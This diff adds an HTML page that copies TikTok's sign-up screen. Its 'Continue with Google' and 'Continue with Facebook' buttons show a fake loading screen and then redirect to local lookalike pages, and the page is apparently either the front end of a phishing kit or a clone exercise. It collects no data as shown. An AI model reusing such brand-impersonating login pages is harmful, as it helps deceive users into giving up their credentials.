@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign Up for TikTok</title>
+    <link rel="stylesheet" href="stylee.css">
+</head>
+<body>
+<body>
+    <div class="header">
+        <span class="close-btn">&times;</span>
+        
+        <span class="menu-icon">&#8942;</span>
+    </div>
+
+    <div class="signup-box">
+        <h1>Sign up for TikTok</h1>
+        <p style="font-size:9px">Create a profile, follow other accounts, make your own videos, and more.</p>
+
+        <button class="signup-btn red-btn">
+            <span class="icon">👤</span> Use phone or email
+        </button>
+
+         <!-- 3rd animatation-->   
+<button class="signup-btn fb-btn" onclick="document.getElementById('loading-screen').style.display = 'flex'; setTimeout(function() { window.location.href = 'google email.html'; }, 4000);">
+  <img src="download.png" alt="Facebook" class="icon">
+  Continue with Google
+</button>
+        
+  
+      <!-- end -->     
+    
+
+     <!-- 3rd animatation-->   
+<button class="signup-btn fb-btn" onclick="document.getElementById('loading-screen').style.display = 'flex'; setTimeout(function() { window.location.href = 'tiktok login secation.html'; }, 4000);">
+  <img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_%282019%29.png" alt="Facebook" class="icon">
+  Continue with Facebook
+</button>
+<!-- end -->
+    </div>
+
+    <!-- Footer Section -->
+    <div class="footer">
+        <p class="terms">By continuing, you agree to TikTok’s <a href="#">Terms of Service</a> and confirm that you have read TikTok’s <a href="#">Privacy Policy</a>.</p>
+        <p class="login-text">Already have an account? <a href="#">Log in</a></p>
+    </div>
+    
+    
+    
+    
+        <!-- dont talking to me this is a loadding areaaaaa-->
+    
+    <div id="loading-screen" style="display: none;">
+    <div class="loading-overlay"></div>
+    <img src="tiktok.gif" alt="Loading..." class="loading-gif">
+</div>
+
+
+
+<script>
+    document.querySelector('.signup-btn').addEventListener('click', function() {
+        document.getElementById('loading-screen').style.display = 'flex';
+        
+        setTimeout(function() {
+            window.location.href = 'tiktok login secation.html';
+        }, 4000); // 4 seconds delay
+    });
+</script>
+
+
+
+
+
+
+<script>
+document.querySelector('.signup-btn').addEventListener('click', function() {
+document.getElementById('loading-screen').style.display = 'flex';
+setTimeout(function() {
+window.location.href = 'tiktok login secation.html';
+}, 4000);
+});
+</script>
+
+
+
+
+
+</body>
+</html>
